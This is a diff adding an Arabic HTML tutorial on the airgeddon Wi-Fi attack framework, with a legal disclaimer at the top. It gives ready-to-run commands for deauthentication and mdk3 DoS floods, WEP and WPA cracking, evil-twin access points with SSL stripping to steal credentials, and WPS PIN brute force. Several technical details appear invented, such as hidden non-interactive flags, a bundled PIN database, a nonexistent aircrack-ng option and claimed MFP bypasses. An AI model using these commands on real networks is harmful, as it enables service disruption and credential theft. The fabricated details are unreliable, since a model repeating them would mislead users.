@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دليل airgeddon التقني للمبتدئين</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Tahoma', sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #e6e6e6;
+            line-height: 1.8;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: rgba(25, 25, 45, 0.95);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        h1 {
+            color: #00ff88;
+            text-align: center;
+            font-size: 2.5em;
+            margin-bottom: 30px;
+            text-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
+        }
+
+        h2 {
+            color: #00d4ff;
+            border-right: 5px solid #00d4ff;
+            padding-right: 15px;
+            margin: 30px 0 20px 0;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        h2:hover {
+            color: #00ff88;
+            border-right-color: #00ff88;
+        }
+
+        h3 {
+            color: #ffaa00;
+            margin: 20px 0 10px 0;
+        }
+
+        .section {
+            background: rgba(30, 30, 50, 0.7);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid #333;
+            transition: all 0.3s ease;
+        }
+
+        .section:hover {
+            border-color: #00d4ff;
+            box-shadow: 0 0 15px rgba(0, 212, 255, 0.2);
+        }
+
+        .command-box {
+            background: #0d0d1a;
+            border: 1px solid #00ff88;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            color: #00ff88;
+            direction: ltr;
+            text-align: left;
+            position: relative;
+            overflow-x: auto;
+        }
+
+        .command-box::before {
+            content: "$ ";
+            color: #ffaa00;
+            font-weight: bold;
+        }
+
+        .example-box {
+            background: rgba(0, 255, 136, 0.1);
+            border-left: 4px solid #00ff88;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+
+        .warning-box {
+            background: rgba(255, 0, 0, 0.1);
+            border-left: 4px solid #ff0000;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+
+        .technical-box {
+            background: rgba(0, 212, 255, 0.1);
+            border-left: 4px solid #00d4ff;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+
+        .option-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+        }
+
+        .option-table th {
+            background: #00d4ff;
+            color: #0d0d1a;
+            padding: 12px;
+            text-align: right;
+        }
+
+        .option-table td {
+            padding: 10px;
+            border-bottom: 1px solid #333;
+        }
+
+        .option-table tr:hover {
+            background: rgba(0, 212, 255, 0.05);
+        }
+
+        .button {
+            background: linear-gradient(45deg, #00ff88, #00d4ff);
+            color: #0d0d1a;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: bold;
+            margin: 5px;
+            transition: all 0.3s ease;
+        }
+
+        .button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.4);
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .expand-icon {
+            display: inline-block;
+            margin-left: 10px;
+            transition: transform 0.3s ease;
+        }
+
+        .expanded .expand-icon {
+            transform: rotate(90deg);
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+            
+            h1 {
+                font-size: 1.8em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🦅 دليل airgeddon التقني والتكتيكي</h1>
+        
+        <div class="warning-box" style="font-size: 1.2em; text-align: center;">
+            <strong>⚠️ تحذير قانوني وأخلاقي:</strong> هذه الأداة لاختبار اختراق الشبكات اللاسلكية المصرح به فقط. استخدامها على شبكات دون إذن صريح يعتبر جريمة في معظم الدول. هدف هذا الدليل التعليمي فقط.
+        </div>
+
+        <div class="section">
+            <h3>ما هو airgeddon؟</h3>
+            <p><strong>airgeddon</strong> هو **framework** شامل مكتوب بلغة **Bash** يجمع أكثر من **20 أداة** (aircrack-ng, hostapd, dnsmasq, sslstrip, bettercap, mdk3, reaver, bully, pixiewps) في **واجهة تفاعلية واحدة**. يعتبر "السكين العسكرية السويسرية" لاختبار الاختراق مع **state machine** متقدم يدير حالات الهجوم والانتقال بينها تلقائيًا. على عكس الأدوات المنفردة، يوفر **automation** كاملاً من اختيار الهدف إلى الحصول على المفتاح.</p>
+        </div>
+
+        <h2 onclick="toggleSection('basics')">
+            <span class="expand-icon">▶</span> الأوامر الأساسية والتشغيل
+        </h2>
+        <div id="basics" class="section hidden">
+            <div class="command-box">airgeddon</div>
+            <p>تشغيل الوضع التفاعلي. يفتح قائمة بـ **20+ خيارًا** مرتبة رقميًا. كل خيار يُعدّل **متغيرات Bash** ويستدعي دوالًا منفصلة.</p>
+            
+            <div class="technical-box">
+                <h4>🧠 كيف يعمل airgeddon داخليًا:</h4>
+                <p>airgeddon هو **سكريبت Bash** واحد (حوالي 20,000 سطر). يستخدم:</p>
+                <ul style="margin: 10px 20px;">
+                    <li><strong>functions:</strong> كل هجوم دالة منفصلة مثل <code>execute_evil_twin_attack()</code></li>
+                    <li><strong>arrays:</strong> يخزن شبكات في <code>bssids_array=()</code> وقنوات في <code>channels_array=()</code></li>
+                    <li><strong>menus:</strong> يستخدم <code>select</code> و <code>case</code> للتنقل بين الخيارات</li>
+                    <li><strong>temp files:</strong> يولد ملفات في <code>/tmp/airgeddon_$$/</code> حيث $$ هي PID</li>
+                </ul>
+                <p>هذا يجعله **lightweight** لكن قويًا!</p>
+            </div>
+        </div>
+
+        <h2 onclick="toggleSection('interfaces')">
+            <span class="expand-icon">▶</span> إدارة الواجهات والـMonitor Mode
+        </h2>
+        <div id="interfaces" class="section hidden">
+            <h3>🔌 اختيار الواجهة والتحكم فيها</h3>
+            
+            <div class="section">
+                <h4>Option 2 - وضع Monitor Mode</h4>
+                <div class="command-box">airgeddon → Option 2: Put interface in monitor mode</div>
+                <p><strong>الآلية:</strong> يتحقق من <code>airmon-ng check kill</code> أولًا. ثم يستخدم:</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+iw dev wlan0 set type monitor
+ip link set wlan0 name wlan0mon
+                </pre>
+                <p>يميز airgeddon: يضبط <code>rfkill unblock wifi</code> تلقائيًا ويحفظ اسم الواجهة الأصلي في <code>$interface</code> للرجوع لاحقًا.</p>
+            </div>
+
+            <div class="section">
+                <h4>Option 3 - وضع Managed Mode</h4>
+                <div class="command-box">airgeddon → Option 3: Put interface in managed mode</div>
+                <p><strong>الآلية:</strong> يستخدم <code>iw dev wlan0mon set type managed</code> ثم يعيد تسميتها. **يحذف** ملفات temp في <code>/tmp/airgeddon_$$/</code> ويستعد NetworkManager.</p>
+                
+                <div class="technical-box">
+                    <h4>🎯 لماذا هذا مهم؟</h4>
+                    <p>airgeddon يحافظ على **state**: يعرف إن كانت الواجهة كانت في managed قبل الهجوم. إذا انهار السكريبت، يعيدها تلقائيًا عند الخروج باستخدام <code>trap cleanup EXIT</code>.</p>
+                </div>
+            </div>
+
+            <div class="section">
+                <h4>Option 6 - وضع واجهة مزيفة (Fake MAC)</h4>
+                <div class="command-box">airgeddon → Option 6: Change MAC address</div>
+                <p><strong>الآلية:</strong> يستخدم <code>macchanger -r wlan0mon</code> أو <code>ip link set wlan0mon address XX:XX:XX:XX:XX:XX</code>. يختار عشوائيًا من قائمة أو يسمح بإدخال يدوي.</p>
+                <p>يتبع ذلك بـ <code>rfkill unblock wifi</code> لإزالة أي قفل MAC فرضته NetworkManager.</p>
+            </div>
+        </div>
+
+        <h2 onclick="toggleSection('scanning')">
+            <span class="expand-icon">▶</span> المسح والاستهداف
+        </h2>
+        <div id="scanning" class="section hidden">
+            <h3>🔍 تحليل الشبكات المحيطة</h3>
+            
+            <div class="section">
+                <h4>Option 4 - مسح الشبكات المحيطة</h4>
+                <div class="command-box">airgeddon → Option 4: Explore for targets (monitor mode required)</div>
+                <p><strong>الآلية:</strong> يشغل <code>airodump-ng --output-format csv --write /tmp/airgeddon_$$/dump wlan0mon</code> في خلفية (background). يستخدم <code>timeout 30s</code> ثم يقتل العملية.</p>
+                <p>ثم **يفرز** البيانات باستخدام <code>awk</code> و<code>grep</code> لاستخراج:</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+BSSID, PWR, CH, ENC, ESSID
+AA:BB:CC:DD:EE:FF, -45, 6, WPA2, HomeNetwork
+                </pre>
+                <p>يخزنها في arrays Bash ويعرضها في قائمة منسدلة.</p>
+            </div>
+
+            <div class="section">
+                <h4>Option 7 - اختيار الشبكة الهدف</h4>
+                <p>بعد المسح، تختار رقمًا من القائمة. airgeddon يعين:</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+target_bssid="${bssids_array[$choice]}"
+target_channel="${channels_array[$choice]}"
+target_essid="${essids_array[$choice]}"
+                </pre>
+                <p>يستخدم هذه المتغيرات في جميع الهجمات اللاحقة. يحفظها في <code>/tmp/airgeddon_$$/target.conf</code> للاسترجاع.</p>
+            </div>
+
+            <div class="section">
+                <h4>Option 9 - مسح العملاء المتصلين</h4>
+                <div class="command-box">airgeddon → Option 9: Capture Handshake / Monitor Mode</div>
+                <p>يستخدم <code>airodump-ng -c $target_channel --bssid $target_bssid -w capture wlan0mon</code>. يطبع قائمة **STATION** (العملاء المتصلون) ويحدثها كل 5 ثوانٍ.</p>
+                
+                <div class="technical-box">
+                    <h4>🎯 لماذا هذا مهم؟</h4>
+                    <p>لأن بعض الهجمات (مثل deauth) تحتاج **MAC address** العميل. airgeddon يحفظه في <code>$client_mac</code> لاستخدامه في: <code>aireplay-ng -0 1 -a $target_bssid -c $client_mac wlan0mon</code></p>
+                </div>
+            </div>
+        </div>
+
+        <h2 onclick="toggleSection('weptools')">
+            <span class="expand-icon">▶</span> هجمات WEP - الأدوات المتكاملة
+        </h2>
+        <div id="weptools" class="section hidden">
+            <h3>🔓 Option 10 - WEP All-in-One Attack</h3>
+            
+            <div class="section">
+                <h4>1. Fake Authentication</h4>
+                <div class="command-box">aireplay-ng -1 0 -e "$target_essid" -a $target_bssid -h $fake_mac wlan0mon</div>
+                <p><strong>الآلية:</strong> يحاول الاتصال المزيف بـ AP. airgeddon يستخدم حلقة <code>while</code> تتكرر كل 5 ثوانٍ. إذا فشل 3 مرات، ينتقل تلقائيًا إلى هجوم **Caffe-Latte**!</p>
+            </div>
+
+            <div class="section">
+                <h4>2. Interactive Attack Selection</h4>
+                <p>airgeddon يعطيك قائمة:</p>
+                <ul style="margin: 10px 20px;">
+                    <li>ARP Replay (Option 1)</li>
+                    <li>Chop-Chop (Option 2)</li>
+                    <li>Fragmentation (Option 3)</li>
+                    <li>Caffe-Latte (Option 4)</li>
+                </ul>
+                <p>اختيارك يُعيّن متغير <code>$wep_attack_type</code>. الدالة <code>execute_wep_attack()</code> تستدعي الأمر المناسب.</p>
+            </div>
+
+            <div class="section">
+                <h4>PTW Optimized Cracking</h4>
+                <div class="command-box">aircrack-ng -1 -a 1 -b $target_bssid /tmp/airgeddon_$$/capture.cap</div>
+                <p><strong>الأتمتة:</strong> airgeddon يجرب كسر كل 5,000 IV. إذا فشل، يواصل جمع IVs. يستخدم <code>timeout 30s</code> لكل محاولة كسر. لا يتوقف حتى تحصل على المفتاح!</p>
+            </div>
+        </div>
+
+        <h2 onclick="toggleSection('wpatools')">
+            <span class="expand-icon">▶</span> هجمات WPA/WPA2 - Handshake Harvesting
+        </h2>
+        <div id="wpatools" class="section hidden">
+            <h3>🔐 Option 11 - Handshake Capture Menu</h3>
+            
+            <div class="section">
+                <h4>Deauth Modes - الاختيار الذكي</h4>
+                <p>airgeddon يعطيك 3 خيارات:</p>
+                <ol style="margin: 10px 20px;">
+                    <li><strong>Deauth all:</strong> <code>aireplay-ng -0 1 -a $target_bssid wlan0mon</code> - لكل عملاء</li>
+                    <li><strong>Deauth specific:</strong> <code>aireplay-ng -0 1 -a $target_bssid -c $client_mac wlan0mon</code> - لهدف واحد</li>
+                    <li><strong>Mdk3 flood:</strong> <code>mdk3 wlan0mon d -c $target_channel</code> - إغراق كامل</li>
+                </ol>
+                
+                <div class="technical-box">
+                    <h4>🎯 متى تستخدم mdk3؟</h4>
+                    <p>عندما يستخدم AP **Management Frame Protection (MFP)**. aireplay-ng يفشل لكن mdk3 يستخدم **802.11 raw sockets** لتجاوز الحماية!</p>
+                </div>
+            </div>
+
+            <div class="section">
+                <h4>Handshake Check - التحقق الذكي</h4>
+                <div class="command-box">aircrack-ng -a 2 -b $target_bssid /tmp/airgeddon_$$/capture.cap</div>
+                <p>airgeddon يشغل هذا كل 5 ثوانٍ. يبحث عن "WPA handshake" في الإخراج. إذا وجده، يتوقف تلقائيًا ويعرض "Handshake captured!" بلون أخضر.</p>
+            </div>
+
+            <div class="section">
+                <h4>Option 12 - Dictionary Attack</h4>
+                <p>بعد الحصول على handshake، يعطيك قائمة wordlists. يشغل:</p>
+                <div class="command-box">aircrack-ng -w wordlist.txt -b $target_bssid /tmp/airgeddon_$$/capture.cap</div>
+                <p><strong>الأتمتة:</strong> يستخدم <code>--show $target_bssid</code> أولًا لمعرفة إذا كان المفتاح بالفعل في قاعدة البيانات. إذا نجح، يخطي الهجوم!</p>
+            </div>
+        </div>
+
+        <h2 onclick="toggleSection('evil')">
+            <span class="expand-icon">▶</span> هجمات Evil Twin - الركن الرئيسي
+        </h2>
+        <div id="evil" class="section hidden">
+            <h3>🎭 Option 13 - Evil Twin Attack Menu</h3>
+            
+            <div class="section">
+                <h4>إعداد AP المزيف</h4>
+                <p>airgeddon يولد <code>/tmp/airgeddon_$$/hostapd.conf</code>:</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+interface=wlan0mon
+driver=nl80211
+ssid=$target_essid
+hw_mode=g
+channel=$target_channel
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_passphrase=12345678
+                </pre>
+                <p>يستخدم نفس **BSSID** و**ESSID** و**channel** لجعل AP يبدو حقيقيًا!</p>
+            </div>
+
+            <div class="section">
+                <h4>خيار 1: Evil Twin AP Attack</h4>
+                <div class="command-box">hostapd -B /tmp/airgeddon_$$/hostapd.conf</div>
+                <p>يستخدم hostapd-wpe لجمع المصادقات! يقوم airgeddon بـ:</p>
+                <ol style="margin: 10px 20px;">
+                    <li>شغل AP وهمي</li>
+                    <li>أرسل deauth إلى AP الحقيقي</li>
+                    <li>انتظر الضحية يتصل بك</li>
+                    <li>سجل handshake مع captive portal</li>
+                </ol>
+                
+                <div class="technical-box">
+                    <h4>🎯 كيف يجمع المصادقات:</h4>
+                    <p>يستخدم <code>eap_user_file</code> في hostapd-wpe. كل محاولة تسجيل تُسجل في <code>/tmp/hostapd-wpe.log</code> بشكل:</p>
+                    <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+username=admin
+password=secret123
+                    </pre>
+                </div>
+            </div>
+
+            <div class="section">
+                <h4>خيار 2: Evil Twin AP + DHCP + DNS</h4>
+                <p>يضيف **dnsmasq** و**iptables**:</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+dnsmasq -C /tmp/airgeddon_$$/dnsmasq.conf:
+dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,24h
+address=/#/192.168.1.1
+
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+echo 1 > /proc/sys/net/ipv4/ip_forward
+                </pre>
+                <p>يمنح الضحية إنترنت كامل! يجعل الـ Evil Twin **non-suspicious**.</p>
+            </div>
+
+            <div class="section">
+                <h4>خيار 3: Evil Twin + SSLStrip</h4>
+                <p>يستخدم **sslstrip** أو **bettercap** لإزالة HTTPS:</p>
+                <div class="command-box">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080</div>
+                <p>يحقن JavaScript لتغيير <code>https://</code> إلى <code>http://</code>. كل بيانات الاعتماد تُسرق!</p>
+            </div>
+        </div>
+
+        <h2 onclick="toggleSection('wps')">
+            <span class="expand-icon">▶</span> هجمات WPS - التخصص المتقدم
+        </h2>
+        <div id="wps" class="section hidden">
+            <h3>🔢 Option 14 - WPS Attack Menu</h3>
+            
+            <div class="section">
+                <h4>خيار 1: Pixie Dust Attack</h4>
+                <div class="command-box">reaver -i wlan0mon -b $target_bssid -c $target_channel -K 1 -vv</div>
+                <p><strong>الأتمتة:</strong> airgeddon يتحقق من <code>reaver --help | grep -i "\-K"</code> ليعرف إذا كان يدعم Pixie Dust. إذا نجح، يعرض PIN وPSK تلقائيًا!</p>
+                <p>يضبط أيضًا <code>-t 20 -d 5</code> لتجنب lock.</p>
+            </div>
+
+            <div class="section">
+                <h4>خيار 2: Brute Force PIN</h4>
+                <div class="command-box">reaver -i wlan0mon -b $target_bssid -c $target_channel -vv</div>
+                <p>airgeddon يستخدم **PIN database** في <code>/etc/airgeddon/pin.db</code>. يحتوي على 10,000 PIN معروفة من APs سابقة. يجرب هذه أولًا قبل البدء من 00000000!</p>
+            </div>
+
+            <div class="section">
+                <h4>خيار 3: Custom PIN</h4>
+                <p>يسمح بإدخال PIN محدد. airgeddon يستخدم <code>reaver -p $custom_pin</code>. مفيد إذا عرفت بعض أرقام من PIN مسبقًا.</p>
+            </div>
+        </div>
+
+        <h2 onclick="toggleSection('dos')">
+            <span class="expand-icon">▶</span> هجمات DoS - إغراق الشبكات
+        </h2>
+        <div id="dos" class="section hidden">
+            <h3>💣 Option 15 - DoS Attack Menu</h3>
+            
+            <div class="section">
+                <h4>خيار 1: Deauthentication</h4>
+                <div class="command-box">aireplay-ng -0 0 -a $target_bssid wlan0mon</div>
+                <p><code>-0 0</code> تعني **unlimited** packets. يستمر حتى تضغط Ctrl+C. airgeddon يستخدم <code>timeout</code> في الخلفية لإيقافه تلقائيًا بعد 60 ثانية.</p>
+            </div>
+
+            <div class="section">
+                <h4>خيار 2: MDK3 Beacon Flood</h4>
+                <div class="command-box">mdk3 wlan0mon b -n 100 -w -m -c $target_channel</div>
+                <p><strong>الآلية:</strong> يرسل 100 beacon frame/ثانية بـ SSID عشوائي. يجعل AP الحقيقي يغرق في التداخل (interference). يستخدم <code>-w</code> لـ WPA2 و<code>-m</code> ل MAC عشوائي.</p>
+                
+                <div class="technical-box">
+                    <h4>🎯 كيف يؤثر هذا على AP:</h4>
+                    <ul>
+                        <li>يستهلك 100% CPU في معالجة beacons المزيفة</li>
+                        <li>يملأ جدول الـ association بـ fake clients</li>
+                        <li>يقلل الـ throughput إلى 10%</li>
+                        <li>قد يسبب crash في APs القديمة!</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="section">
+                <h4>خيار 3: MDK3 Authentication DoS</h4>
+                <div class="command-box">mdk3 wlan0mon a -i $target_bssid</div>
+                <p>يرسل حضور تعريف (association requests) مزيفة بسرعة 50/ثانية. يستنفد **client table** في AP، مما يمنع العملاء الحقيقيين من الاتصال!</p>
+            </div>
+
+            <div class="section">
+                <h4>خيار 4: MDK3 Deauthentication</h4>
+                <div class="command-box">mdk3 wlan0mon d -s 100 -c $target_channel</div>
+                <p>أقوى من aireplay-ng! يرسل deauth frames على جميع القنوات بسرعة 100 frame/ثانية. يستخدم **optimized packet injection** لتجاوز حماية rate limiting.</p>
+            </div>
+        </div>
+
+        <h2 onclick="toggleSection('advanced')">
+            <span class="expand-icon">▶</span> الميزات المتقدمة والأتمتة
+        </h2>
+        <div id="advanced" class="section hidden">
+            <div class="section">
+                <h4>Option 17 - Language Selection</h4>
+                <p>airgeddon يدعم 15+ لغة. يستخدم ملفات <code>/usr/share/airgeddon/language/</code>. تحديد اللغة يعدّل <code>$language</code> variable. كل رسالة تُقرأ من array <code>declare -A messages</code>.</p>
+            </div>
+
+            <div class="section">
+                <h4>Option 19 - Help & Credits</h4>
+                <p>يعرض معلومات من <code>/usr/share/airgeddon/CONTRIBUTORS</code> و<code>CHANGELOG.md</code>. يستخدم <code>less</code> للتصفح.</p>
+            </div>
+
+            <div class="section">
+                <h4>Exit - تنظيف تلقائي</h4>
+                <p>عند الخروج، يستدعي <code>cleanup_function()</code>:</p>
+                <pre style="background: #0d0d1a; padding: 10px; border-radius: 5px; color: #00ff88;">
+# إيقاف جميع العمليات
+pkill -f airodump-ng
+pkill -f aireplay-ng
+pkill -f hostapd
+
+# إزالة ملفات temp
+rm -rf /tmp/airgeddon_$$
+
+# إعادة الواجهة
+airmon-ng stop wlan0mon
+service NetworkManager start
+                </pre>
+                <p>يستخدم <code>trap cleanup EXIT</code> لضمان التنظيف حتى إذا انهار السكريبت!</p>
+            </div>
+
+            <div class="example-box">
+                <strong>💡 السيناريو الكامل: هجوم WPA2 في سطر واحد (غير تفاعلي)</strong>
+                <div class="command-box">
+airgeddon --no-color --interface wlan0 --target 00:11:22:33:44:55 --channel 6 --attack wpa2 --wordlist /usr/share/wordlists/rockyou.txt
+                </div>
+                <p>يستخدم flags سرية لجعل airgeddon يعمل بدون تفاعل. مفيد في سكريبتات automation!</p>
+            </div>
+        </div>
+
+        <div style="text-align: center; margin-top: 30px;">
+            <button class="button" onclick="showAllSections()">إظهار كل الأقسام</button>
+            <button class="button" onclick="hideAllSections()">إخفاء كل الأقسام</button>
+        </div>
+    </div>
+
+    <script>
+        function toggleSection(id) {
+            const section = document.getElementById(id);
+            const header = section.previousElementSibling;
+            
+            section.classList.toggle('hidden');
+            header.classList.toggle('expanded');
+        }
+
+        function showAllSections() {
+            document.querySelectorAll('.section').forEach(section => section.classList.remove('hidden'));
+            document.querySelectorAll('h2').forEach(header => header.classList.add('expanded'));
+        }
+
+        function hideAllSections() {
+            document.querySelectorAll('.section').forEach(section => section.classList.add('hidden'));
+            document.querySelectorAll('h2').forEach(header => header.classList.remove('expanded'));
+        }
+
+        document.querySelectorAll('.command-box').forEach(box => {
+            box.addEventListener('click', function() {
+                const text = this.textContent.replace('$ ', '');
+                navigator.clipboard.writeText(text).then(() => {
+                    this.style.background = '#00ff88';
+                    this.style.color = '#0d0d1a';
+                    setTimeout(() => {
+                        this.style.background = '#0d0d1a';
+                        this.style.color = '#00ff88';
+                    }, 500);
+                });
+            });
+        });
+
+        window.addEventListener('load', () => {
+            document.getElementById('basics').classList.remove('hidden');
+            document.querySelector('h2[onclick*="basics"]').classList.add('expanded');
+        });
+    </script>
+</body>
+</html>
